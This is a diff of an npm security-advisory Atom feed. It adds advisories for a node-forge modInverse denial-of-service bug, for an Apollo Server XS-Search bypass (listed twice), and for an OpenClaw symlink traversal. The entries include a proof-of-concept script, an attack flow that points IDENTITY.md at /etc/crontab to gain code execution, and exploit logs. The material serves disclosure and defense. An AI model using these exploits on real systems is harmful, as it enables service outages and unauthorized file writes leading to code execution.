@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-03-26T21:48:27.458Z</updated>
+    <updated>2026-03-26T22:01:40.828Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,397 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[node-forge] Forge has Denial of Service via Infinite Loop in BigInteger.modInverse() with Zero Input]]></title>
+        <id>https://github.com/advisories/GHSA-5m6q-g25r-mvwx</id>
+        <link href="https://github.com/advisories/GHSA-5m6q-g25r-mvwx"/>
+        <updated>2026-03-26T21:57:49.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A Denial of Service (DoS) vulnerability exists in the node-forge library due to an infinite loop in the BigInteger.modInverse() function (inherited from the bundled jsbn library). When modInverse() is called with a zero value as input, the internal Extended Euclidean Algorithm enters an unreachable exit condition, causing the process to hang indefinitely and consume 100% CPU.
+Affected Package</p>
+<p>Package name: node-forge (npm: node-forge)
+Repository: <a href="https://github.com/digitalbazaar/forge">https://github.com/digitalbazaar/forge</a>
+Affected versions: All versions (including latest)
+Affected file: lib/jsbn.js, function bnModInverse()
+Root cause component: Bundled copy of the jsbn (JavaScript Big Number) library</p>
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+<p>Type: Denial of Service (DoS)
+CWE: CWE-835 (Loop with Unreachable Exit Condition)
+Attack vector: Network (if the application processes untrusted input that reaches modInverse)
+Privileges required: None
+User interaction: None
+Impact: Availability (process hangs indefinitely)
+Suggested CVSS v3.1 score: 5.3–7.5 (depending on the context of usage)</p>
+<h2 id="root-cause-analysis">Root Cause Analysis</h2>
+<p>The BigInteger.prototype.modInverse(m) function in lib/jsbn.js implements the Extended Euclidean Algorithm to compute the modular multiplicative inverse of this modulo m.
+Mathematically, the modular inverse of 0 does not exist — gcd(0, m) = m ≠ 1 for any m &gt; 1. However, the implementation does not check whether the input value is zero before entering the algorithm's main loop. When this equals 0, the algorithm's loop condition is never satisfied for termination, resulting in an infinite loop.
+The relevant code path in lib/jsbn.js:</p>
+<pre><code class="language-js">javascriptfunction bnModInverse(m) {
+  // ... setup ...
+  // No check for this == 0
+  // Enters Extended Euclidean Algorithm loop that never terminates when this == 0
+}
+</code></pre>
+<h2 id="attack-scenario">Attack Scenario</h2>
+<p>Any application using node-forge that passes attacker-controlled or untrusted input to a code path involving modInverse() is vulnerable. Potential attack surfaces include:</p>
+<p>DSA/ECDSA signature verification — A crafted signature with s = 0 would trigger s.modInverse(q), causing the verifier to hang.
+Custom RSA or Diffie-Hellman implementations — Applications performing modular arithmetic with user-supplied parameters.
+Any cryptographic protocol where an attacker can influence a value that is subsequently passed to modInverse().</p>
+<p>A single malicious request can cause the Node.js event loop to block indefinitely, rendering the entire application unresponsive.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Environment Setup</p>
+<pre><code class="language-bash">mkdir forge-poc &amp;&amp; cd forge-poc
+npm init -y
+npm install node-forge
+</code></pre>
+<p>Reproduction (poc.js)
+A single script that safely detects the vulnerability using a child process with timeout. The parent process is never at risk of hanging.</p>
+<pre><code class="language-bash">mkdir forge-poc &amp;&amp; cd forge-poc
+npm init -y
+npm install node-forge
+# Save the script below as poc.js, then run:
+node poc.js
+</code></pre>
+<pre><code class="language-javascript">'use strict';
+const { spawnSync } = require('child_process');
+
+const childCode = `
+  const forge = require('node-forge');
+  // jsbn may not be auto-loaded; try explicit require if needed
+  if (!forge.jsbn) {
+    try { require('node-forge/lib/jsbn'); } catch(e) {}
+  }
+  if (!forge.jsbn || !forge.jsbn.BigInteger) {
+    console.error('ERROR: forge.jsbn.BigInteger not available');
+    process.exit(2);
+  }
+  const BigInteger = forge.jsbn.BigInteger;
+  const zero = new BigInteger('0', 10);
+  const mod = new BigInteger('3', 10);
+  // This call should throw or return 0, but instead loops forever
+  const inv = zero.modInverse(mod);
+  console.log('returned: ' + inv.toString());
+`;
+
+console.log('[*] Testing: BigInteger(0).modInverse(3)');
+console.log('[*] Expected: throw an error or return quickly');
+console.log('[*] Spawning child process with 5s timeout...');
+console.log();
+
+const result = spawnSync(process.execPath, ['-e', childCode], {
+  encoding: 'utf8',
+  timeout: 5000,
+});
+
+if (result.error &amp;&amp; result.error.code === 'ETIMEDOUT') {
+  console.log('[VULNERABLE] Child process timed out after 5s');
+  console.log('  -&gt; modInverse(0, 3) entered an infinite loop (DoS confirmed)');
+  process.exit(0);
+}
+
+if (result.status === 2) {
+  console.log('[ERROR] Could not access BigInteger:', result.stderr.trim());
+  console.log('  -&gt; Check your node-forge installation');
+  process.exit(1);
+}
+
+if (result.status === 0) {
+  console.log('[NOT VULNERABLE] modInverse returned:', result.stdout.trim());
+  process.exit(1);
+}
+
+console.log('[NOT VULNERABLE] Child exited with error (status ' + result.status + ')');
+if (result.stderr) console.log('  stderr:', result.stderr.trim());
+process.exit(1);
+</code></pre>
+<p>Expected Output</p>
+<pre><code>[*] Testing: BigInteger(0).modInverse(3)
+[*] Expected: throw an error or return quickly
+[*] Spawning child process with 5s timeout...
+
+[VULNERABLE] Child process timed out after 5s
+  -&gt; modInverse(0, 3) entered an infinite loop (DoS confirmed)
+Verified On
+</code></pre>
+<p>node-forge v1.3.1 (latest at time of writing)
+Node.js v18.x / v20.x / v22.x
+macOS / Linux / Windows</p>
+<h2 id="impact">Impact</h2>
+<p>Availability: An attacker can cause a complete Denial of Service by sending a single crafted input that reaches the modInverse() code path. The Node.js process will hang indefinitely, blocking the event loop and making the application unresponsive to all subsequent requests.
+Scope: node-forge is a widely used cryptographic library with millions of weekly downloads on npm. Any application that processes untrusted cryptographic parameters through node-forge may be affected.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Add a zero-value check at the entry of bnModInverse() in lib/jsbn.js:</p>
+<pre><code class="language-javascript">function bnModInverse(m) {
+  var ac = m.isEven();
+  // Add this check:
+  if (this.signum() == 0) {
+    throw new Error('BigInteger has no modular inverse: input is zero');
+  }
+  // ... rest of the existing implementation ...
+}
+</code></pre>
+<p>Alternatively, return BigInteger.ZERO if that behavior is preferred, though throwing an error is more mathematically correct and consistent with other BigInteger implementations (e.g., Java's BigInteger.modInverse() throws ArithmeticException).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/digitalbazaar/forge/security/advisories/GHSA-5m6q-g25r-mvwx">https://github.com/digitalbazaar/forge/security/advisories/GHSA-5m6q-g25r-mvwx</a></li>
+<li><a href="https://github.com/digitalbazaar/forge/commit/9bb8d67b99d17e4ebb5fd7596cd699e11f25d023">https://github.com/digitalbazaar/forge/commit/9bb8d67b99d17e4ebb5fd7596cd699e11f25d023</a></li>
+<li><a href="https://github.com/advisories/GHSA-5m6q-g25r-mvwx">https://github.com/advisories/GHSA-5m6q-g25r-mvwx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5m6q-g25r-mvwx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-26T21:57:48.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[apollo-server-core] Apollo Server: Browser bug allows for bypass of XS-Search (read-only Cross-Site Request Forgery) prevention]]></title>
+        <id>https://github.com/advisories/GHSA-9q82-xgwf-vj6h</id>
+        <link href="https://github.com/advisories/GHSA-9q82-xgwf-vj6h"/>
+        <updated>2026-03-26T21:53:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="impact">Impact</h1>
+<p>In a Cross-Site Request Forgery attack, untrusted web content causes browsers to send authenticated requests to web servers which use cookies for authentication. While the web content is prevented from reading the request's response due to the Cross-Origin Request Sharing (CORS) protocol, an attacker may be able to cause side effects in the server ("CSRF" attack), or learn something about the response via timing analysis ("XS-Search" attack).</p>
+<p>Apollo Server has a built-in feature which prevents CSRF and XS-Search attacks: it refuses to process GraphQL requests that could possibly have been sent by a spec-compliant web browser without a protective "preflight" step. See <a href="https://www.apollographql.com/docs/apollo-server/security/cors">Apollo Server's docs</a> for more details on CORS, CSRF attacks, and Apollo Server's CSRF prevention feature.</p>
+<p>This feature is fully effective against attacks carried out against users of spec-compliant browsers. Unfortunately, a major browser introduced a bug in 2025 which meant in certain cases, it failed to follow the CORS spec. The browser's maintainers have already committed to fixing the bug and making the browser spec-compliant again.</p>
+<p>Even with this bug, Apollo Server's CSRF prevention feature <strong>blocks</strong> "side effect" CSRF attacks: Apollo Server will still correctly refuse to execute <em>mutations</em> in requests that were not preflighted. However, some specially crafted authenticated GraphQL <em>queries</em> can be issued across origins <em>without preflight</em> in buggy versions of this browser, allowing for XS-Search attacks: an attacker can analyze response times to learn facts about the responses to requests such as whether fields return null or approximately how many list entries are returned from fields.</p>
+<p>GraphQL servers are only vulnerable if they rely on cookies (or HTTP Basic Auth) for authentication.</p>
+<h2 id="patches">Patches</h2>
+<p>The vulnerability is patched in <code>@apollo/server</code> v5.5.0. This release contains a single change: GraphQL requests sent in HTTP <code>GET</code> requests which contain a <code>Content-Type</code> header naming a type other than <code>application/json</code> are rejected. (<code>GET</code> requests with no <code>Content-Type</code> are allowed.) This change prevents XS-Search attacks even in browsers which are non-compliant in ways similar to this browser.</p>
+<p>There are no known cases where GraphQL apps depend on the ability of clients to send non-empty <code>Content-Type</code> headers with GET requests other than <code>application/json</code>, so this change has not been made configurable; if this change breaks a use case, <a href="https://github.com/apollographql/apollo-server/issues">file an issue</a> and more configurability can be added.</p>
+<p>Apollo is not currently providing a patch for previous major versions of Apollo Server, which are all <a href="https://www.apollographql.com/docs/apollo-server/previous-versions">end-of-life</a>.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If upgrading is not possible, this particular browser's bug can be mitigated by preventing any HTTP request with a <code>Content-Type</code> header containing <code>message/</code> from reaching Apollo Server (e.g. in a proxy or middleware).</p>
+<p>For example, when using Apollo Server's Express integration, something like this can be placed <em>before</em> attaching <code>expressMiddleware</code> to the <code>app</code>:</p>
+<pre><code class="language-js">app.use((req, res, next) =&gt; {
+  for (let i = 0; i &lt; req.rawHeaders.length - 1; i += 2) {
+    if (
+      req.rawHeaders[i].toLowerCase() === 'content-type' &amp;&amp;
+      req.rawHeaders[i + 1].includes('message/')
+    ) {
+      return res.status(415).json({ error: 'Content-Type not allowed' });
+    }
+  }
+  next();
+});
+</code></pre>
+<p>While the patch prevents a broader class of similar issues, the only known way to exploit this vulnerability is against a particular browser which currently plans to ship a fix in May 2026. If it is already past June 2026 and this vulnerability has not been addressed yet, it is likely that the system is not currently vulnerable. Upgrading to the latest version of Apollo Server is still recommended for the broader protection.</p>
+<h2 id="resources">Resources</h2>
+<p>The browser bug causes a similar vulnerability in Apollo Router; see <a href="https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p">https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/apollographql/apollo-server/security/advisories/GHSA-9q82-xgwf-vj6h">https://github.com/apollographql/apollo-server/security/advisories/GHSA-9q82-xgwf-vj6h</a></li>
+<li><a href="https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p">https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p</a></li>
+<li><a href="https://github.com/apollographql/apollo-server/commit/ada12001c4e95b5c779d80314a5a32e33087b5cf">https://github.com/apollographql/apollo-server/commit/ada12001c4e95b5c779d80314a5a32e33087b5cf</a></li>
+<li><a href="https://github.com/apollographql/apollo-server/releases/tag/@apollo/server@5.5.0">https://github.com/apollographql/apollo-server/releases/tag/@apollo/server@5.5.0</a></li>
+<li><a href="https://www.apollographql.com/docs/apollo-server/previous-versions">https://www.apollographql.com/docs/apollo-server/previous-versions</a></li>
+<li><a href="https://github.com/advisories/GHSA-9q82-xgwf-vj6h">https://github.com/advisories/GHSA-9q82-xgwf-vj6h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9q82-xgwf-vj6h</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-26T21:53:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@apollo/server] Apollo Server: Browser bug allows for bypass of XS-Search (read-only Cross-Site Request Forgery) prevention]]></title>
+        <id>https://github.com/advisories/GHSA-9q82-xgwf-vj6h</id>
+        <link href="https://github.com/advisories/GHSA-9q82-xgwf-vj6h"/>
+        <updated>2026-03-26T21:53:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="impact">Impact</h1>
+<p>In a Cross-Site Request Forgery attack, untrusted web content causes browsers to send authenticated requests to web servers which use cookies for authentication. While the web content is prevented from reading the request's response due to the Cross-Origin Request Sharing (CORS) protocol, an attacker may be able to cause side effects in the server ("CSRF" attack), or learn something about the response via timing analysis ("XS-Search" attack).</p>
+<p>Apollo Server has a built-in feature which prevents CSRF and XS-Search attacks: it refuses to process GraphQL requests that could possibly have been sent by a spec-compliant web browser without a protective "preflight" step. See <a href="https://www.apollographql.com/docs/apollo-server/security/cors">Apollo Server's docs</a> for more details on CORS, CSRF attacks, and Apollo Server's CSRF prevention feature.</p>
+<p>This feature is fully effective against attacks carried out against users of spec-compliant browsers. Unfortunately, a major browser introduced a bug in 2025 which meant in certain cases, it failed to follow the CORS spec. The browser's maintainers have already committed to fixing the bug and making the browser spec-compliant again.</p>
+<p>Even with this bug, Apollo Server's CSRF prevention feature <strong>blocks</strong> "side effect" CSRF attacks: Apollo Server will still correctly refuse to execute <em>mutations</em> in requests that were not preflighted. However, some specially crafted authenticated GraphQL <em>queries</em> can be issued across origins <em>without preflight</em> in buggy versions of this browser, allowing for XS-Search attacks: an attacker can analyze response times to learn facts about the responses to requests such as whether fields return null or approximately how many list entries are returned from fields.</p>
+<p>GraphQL servers are only vulnerable if they rely on cookies (or HTTP Basic Auth) for authentication.</p>
+<h2 id="patches">Patches</h2>
+<p>The vulnerability is patched in <code>@apollo/server</code> v5.5.0. This release contains a single change: GraphQL requests sent in HTTP <code>GET</code> requests which contain a <code>Content-Type</code> header naming a type other than <code>application/json</code> are rejected. (<code>GET</code> requests with no <code>Content-Type</code> are allowed.) This change prevents XS-Search attacks even in browsers which are non-compliant in ways similar to this browser.</p>
+<p>There are no known cases where GraphQL apps depend on the ability of clients to send non-empty <code>Content-Type</code> headers with GET requests other than <code>application/json</code>, so this change has not been made configurable; if this change breaks a use case, <a href="https://github.com/apollographql/apollo-server/issues">file an issue</a> and more configurability can be added.</p>
+<p>Apollo is not currently providing a patch for previous major versions of Apollo Server, which are all <a href="https://www.apollographql.com/docs/apollo-server/previous-versions">end-of-life</a>.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If upgrading is not possible, this particular browser's bug can be mitigated by preventing any HTTP request with a <code>Content-Type</code> header containing <code>message/</code> from reaching Apollo Server (e.g. in a proxy or middleware).</p>
+<p>For example, when using Apollo Server's Express integration, something like this can be placed <em>before</em> attaching <code>expressMiddleware</code> to the <code>app</code>:</p>
+<pre><code class="language-js">app.use((req, res, next) =&gt; {
+  for (let i = 0; i &lt; req.rawHeaders.length - 1; i += 2) {
+    if (
+      req.rawHeaders[i].toLowerCase() === 'content-type' &amp;&amp;
+      req.rawHeaders[i + 1].includes('message/')
+    ) {
+      return res.status(415).json({ error: 'Content-Type not allowed' });
+    }
+  }
+  next();
+});
+</code></pre>
+<p>While the patch prevents a broader class of similar issues, the only known way to exploit this vulnerability is against a particular browser which currently plans to ship a fix in May 2026. If it is already past June 2026 and this vulnerability has not been addressed yet, it is likely that the system is not currently vulnerable. Upgrading to the latest version of Apollo Server is still recommended for the broader protection.</p>
+<h2 id="resources">Resources</h2>
+<p>The browser bug causes a similar vulnerability in Apollo Router; see <a href="https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p">https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/apollographql/apollo-server/security/advisories/GHSA-9q82-xgwf-vj6h">https://github.com/apollographql/apollo-server/security/advisories/GHSA-9q82-xgwf-vj6h</a></li>
+<li><a href="https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p">https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p</a></li>
+<li><a href="https://github.com/apollographql/apollo-server/commit/ada12001c4e95b5c779d80314a5a32e33087b5cf">https://github.com/apollographql/apollo-server/commit/ada12001c4e95b5c779d80314a5a32e33087b5cf</a></li>
+<li><a href="https://github.com/apollographql/apollo-server/releases/tag/@apollo/server@5.5.0">https://github.com/apollographql/apollo-server/releases/tag/@apollo/server@5.5.0</a></li>
+<li><a href="https://www.apollographql.com/docs/apollo-server/previous-versions">https://www.apollographql.com/docs/apollo-server/previous-versions</a></li>
+<li><a href="https://github.com/advisories/GHSA-9q82-xgwf-vj6h">https://github.com/advisories/GHSA-9q82-xgwf-vj6h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9q82-xgwf-vj6h</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-26T21:53:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[openclaw] OpenClaw: Symlink Traversal via IDENTITY.md appendFile in agents.create/update (Incomplete Fix for CVE-2026-32013)]]></title>
+        <id>https://github.com/advisories/GHSA-7xr2-q9vf-x4r5</id>
+        <link href="https://github.com/advisories/GHSA-7xr2-q9vf-x4r5"/>
+        <updated>2026-03-26T21:49:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The patch for CVE-2026-32013 introduced symlink resolution and workspace boundary enforcement for <code>agents.files.get</code> and <code>agents.files.set</code>. However, two other handlers in the same file (<code>agents.create</code> and <code>agents.update</code>) still use raw <code>fs.appendFile</code> on the <code>IDENTITY.md</code> file <strong>without any symlink containment check</strong>. An attacker who can place a symlink in the agent workspace can hijack the <code>IDENTITY.md</code> path to append attacker-controlled content to arbitrary files on the system.</p>
+<h3 id="details">Details</h3>
+<p>In <code>src/gateway/server-methods/agents.ts</code>, the <code>agents.create</code> handler constructs the identity path and appends agent metadata without verifying symlinks:</p>
+<pre><code class="language-typescript">// agents.create — line 283-291
+const identityPath = path.join(workspaceDir, DEFAULT_IDENTITY_FILENAME);
+const lines = [
+  "",
+  `- Name: ${safeName}`,
+  ...(emoji ? [`- Emoji: ${sanitizeIdentityLine(emoji)}`] : []),
+  ...(avatar ? [`- Avatar: ${sanitizeIdentityLine(avatar)}`] : []),
+  "",
+];
+await fs.appendFile(identityPath, lines.join("\n"), "utf-8"); // ← NO SYMLINK CHECK
+</code></pre>
+<p>The <code>agents.update</code> handler has the same issue at line 348-349:</p>
+<pre><code class="language-typescript">// agents.update — line 348-349
+const identityPath = path.join(workspace, DEFAULT_IDENTITY_FILENAME);
+await fs.appendFile(identityPath, `\n- Avatar: ${sanitizeIdentityLine(avatar)}\n`, "utf-8"); // ← NO SYMLINK CHECK
+</code></pre>
+<p><code>fs.appendFile</code> follows symlinks by default. If the <code>IDENTITY.md</code> file in the workspace is a symlink pointing to a sensitive file (e.g., <code>/etc/crontab</code>, <code>~/.bashrc</code>, or <code>~/.ssh/authorized_keys</code>), calling <code>agents.create</code> will append the agent identity metadata to that file.</p>
+<p>The <code>ensureAgentWorkspace</code> function (called at line 274 before the append) uses exclusive-create mode (<code>flag: 'wx'</code>) for <code>IDENTITY.md</code>. If a symlink already exists at that path, the <code>EEXIST</code> error is silently caught, and the subsequent <code>fs.appendFile</code> follows the symlink.</p>
+<p><strong>Attack flow:</strong></p>
+<pre><code>1. Attacker plants symlink: workspace/IDENTITY.md → /etc/crontab
+2. ensureAgentWorkspace skips creation (EEXIST from symlink)
+3. fs.appendFile follows symlink → writes to /etc/crontab
+4. Attacker-controlled content (name, emoji, avatar) injected into crontab → RCE
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong> Docker and Python 3 installed.</p>
+<p><strong>Step 1: Build and start the test environment.</strong></p>
+<pre><code class="language-bash">cd llm-enhance/cve-finding/RCE/CVE-2026-32013-identity-appendFile-variant-exp/
+docker compose up -d --build
+sleep 3
+</code></pre>
+<p><strong>Step 2: Run the exploit.</strong></p>
+<pre><code class="language-bash">python3 poc_exploit.py
+</code></pre>
+<p>This script:</p>
+<ol>
+<li>Plants a symlink <code>IDENTITY.md → /etc/target-file.txt</code> inside the agent workspace</li>
+<li>Calls the <code>agents.create</code> API endpoint via HTTP POST</li>
+<li>Verifies that the agent identity metadata was appended to <code>/etc/target-file.txt</code></li>
+</ol>
+<p><strong>Step 3: Run the control experiment.</strong></p>
+<pre><code class="language-bash">python3 control-patched_realpath.py
+</code></pre>
+<p><strong>Step 4: Cleanup.</strong></p>
+<pre><code class="language-bash">docker compose down
+</code></pre>
+<h3 id="log-of-evidence">Log of Evidence</h3>
+<p><strong>Exploit output:</strong></p>
+<pre><code>=== CVE-2026-32013 Variant: Symlink Traversal via IDENTITY.md appendFile ===
+[*] Planting symlink: IDENTITY.md -&gt; /etc/target-file.txt
+[*] Symlink: lrwxrwxrwx 1 root root 20 /workspaces/evil-agent/IDENTITY.md -&gt; /etc/target-file.txt
+[*] Original /etc/target-file.txt: ORIGINAL_SENSITIVE_CONTENT
+
+[*] Calling agents.create with name='evil-agent'...
+[*] API response: {'ok': True, 'agentId': 'evil-agent', 'workspace': '/workspaces/evil-agent'}
+
+[*] /etc/target-file.txt after exploit:
+    ORIGINAL_SENSITIVE_CONTENT
+
+- Name: evil-agent
+- Emoji: 💀
+- Avatar: evil.png
+
+[+] SUCCESS! Symlink traversal confirmed.
+[+] fs.appendFile followed IDENTITY.md symlink and wrote to /etc/target-file.txt
+[+] Attacker-controlled content injected into arbitrary file.
+</code></pre>
+<p><strong>Control output:</strong></p>
+<pre><code>=== CONTROL: Patched agents.create blocks symlink traversal ===
+[*] Planting symlink: IDENTITY.md -&gt; /etc/target-file.txt
+[*] Original /etc/target-file.txt: ORIGINAL_SENSITIVE_CONTENT
+
+[*] Calling PATCHED agents.create with name='safe-agent'...
+[*] API response: {'ok': False, 'error': 'symlink_traversal_blocked', 'realPath': '/etc/target-file.txt'}
+
+[*] /etc/target-file.txt after patched call: ORIGINAL_SENSITIVE_CONTENT
+
+[+] CONTROL PASSED: Patched endpoint detected and blocked symlink traversal.
+[+] /etc/target-file.txt remains unchanged.
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>An attacker who can plant a symlink in the agent workspace directory can use the <code>agents.create</code> or <code>agents.update</code> gateway API to <strong>append attacker-controlled content to arbitrary files</strong> on the system. If the target file is:</p>
+<ul>
+<li><code>/etc/crontab</code> or user crontab → <strong>Remote Code Execution</strong></li>
+<li><code>~/.bashrc</code> or <code>~/.profile</code> → <strong>Persistent code execution on login</strong></li>
+<li><code>~/.ssh/authorized_keys</code> → <strong>Unauthorized SSH access</strong></li>
+<li>Application configuration files → <strong>Service disruption</strong></li>
+</ul>
+<p>The attacker-controlled content includes the agent name (arbitrary string), emoji, and avatar fields, which are only lightly sanitized (whitespace normalization via <code>sanitizeIdentityLine</code>).</p>
+<h3 id="affected-products">Affected products</h3>
+<ul>
+<li><strong>Ecosystem</strong>: npm</li>
+<li><strong>Package name</strong>: openclaw</li>
+<li><strong>Affected versions</strong>: &lt;= 2026.2.22</li>
+<li><strong>Patched versions</strong>: None</li>
+</ul>
+<h3 id="occurrences">Occurrences</h3>
+<table>
+<thead>
+<tr>
+<th align="left">Permalink</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L283-L291">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L283-L291</a></td>
+<td align="left"><code>agents.create</code> handler uses <code>fs.appendFile</code> on <code>IDENTITY.md</code> without symlink resolution or workspace boundary check.</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L348-L349">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L348-L349</a></td>
+<td align="left"><code>agents.update</code> handler uses <code>fs.appendFile</code> on <code>IDENTITY.md</code> without symlink resolution or workspace boundary check.</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L274">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L274</a></td>
+<td align="left"><code>ensureAgentWorkspace</code> is called before append, but its exclusive-create (<code>wx</code>) flag silently skips existing symlinks (EEXIST).</td>
+</tr>
+</tbody></table>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-7xr2-q9vf-x4r5">https://github.com/openclaw/openclaw/security/advisories/GHSA-7xr2-q9vf-x4r5</a></li>
+<li><a href="https://github.com/advisories/GHSA-fgvx-58p6-gjwc">https://github.com/advisories/GHSA-fgvx-58p6-gjwc</a></li>
+<li><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L274">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L274</a></li>
+<li><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L283-L291">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L283-L291</a></li>
+<li><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L348-L349">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L348-L349</a></li>
+<li><a href="https://github.com/advisories/GHSA-7xr2-q9vf-x4r5">https://github.com/advisories/GHSA-7xr2-q9vf-x4r5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7xr2-q9vf-x4r5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-26T21:49:25.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[openclaw] OpenClaw: Image Tool `tools.fs.workspaceOnly` Bypass via Sandbox Bridge Mounts]]></title>
         <id>https://github.com/advisories/GHSA-cfp9-w5v9-3q4h</id>
@@ -685,173 +1076,5 @@
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-03-26T19:50:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw is vulnerable to unauthenticated resource exhaustion through its voice call webhook handling]]></title>
-        <id>https://github.com/advisories/GHSA-rm59-992w-x2mv</id>
-        <link href="https://github.com/advisories/GHSA-rm59-992w-x2mv"/>
-        <updated>2026-03-26T19:50:41.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Voice Call webhook handling buffered request bodies before provider signature checks, enabling bounded unauthenticated resource exhaustion.</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code> (npm)</li>
-<li>Affected: &lt; 2026.3.22</li>
-<li>Fixed: &gt;= 2026.3.22</li>
-<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
-<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
-</ul>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>651dc7450b68a5396a009db78ef9382633707ead</code></li>
-</ul>
-<h2 id="release-status">Release Status</h2>
-<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
-<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
-<ul>
-<li>extensions/voice-call/src/webhook.ts now enforces header gating and shared pre-auth body caps before reading attacker-controlled request bodies.</li>
-<li>extensions/voice-call/src/webhook.test.ts ships regression coverage for missing-signature, oversize, and timeout pre-auth webhook cases.</li>
-</ul>
-<p>OpenClaw thanks @SEORY0 for reporting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rm59-992w-x2mv">https://github.com/openclaw/openclaw/security/advisories/GHSA-rm59-992w-x2mv</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/651dc7450b68a5396a009db78ef9382633707ead">https://github.com/openclaw/openclaw/commit/651dc7450b68a5396a009db78ef9382633707ead</a></li>
-<li><a href="https://github.com/advisories/GHSA-rm59-992w-x2mv">https://github.com/advisories/GHSA-rm59-992w-x2mv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rm59-992w-x2mv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-26T19:50:41.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Bonjour/DNS-SD TXT metadata steers CLI routing after failed service resolution]]></title>
-        <id>https://github.com/advisories/GHSA-rvqr-hrcc-j9vv</id>
